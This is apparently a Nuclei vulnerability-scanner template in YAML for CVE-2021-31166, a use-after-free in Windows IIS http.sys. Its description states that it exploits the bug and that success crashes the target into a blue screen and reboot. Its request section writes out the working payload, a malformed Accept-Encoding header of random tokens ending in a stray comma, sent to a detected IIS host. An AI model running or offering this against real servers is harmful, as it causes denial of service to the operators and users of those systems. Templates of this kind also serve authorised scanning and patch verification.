id: CVE-2021-31166

info:
  name: Windows IIS HTTP Protocol Stack DOS
  author: dwisiswant0
  severity: critical
  description: |
    This template exploits CVE-2021-31166, a UAF bug in http.sys
    when parsing specially crafted Accept-Encoding headers
    that was patched by Microsoft in May 2021, on vulnerable
    IIS servers. Successful exploitation will result in
    the target computer BSOD'ing before subsequently rebooting.
    Note that the target IIS server may or may not come back up,
    this depends on the target's settings as to whether IIS
    is configured to start on reboot.
  reference:
    - https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31166
  tags: cve,cve2021,microsoft,windows,iis

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}

      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        Accept-Encoding: {{to_lower(rand_base(5) + ", " + rand_base(3) + ", ,")}}

    req-condition: true
    matchers:
      - type: dsl
        dsl:
          - status_code_2 != status_code_1
          - contains(all_headers_1, "IIS")
        condition: and
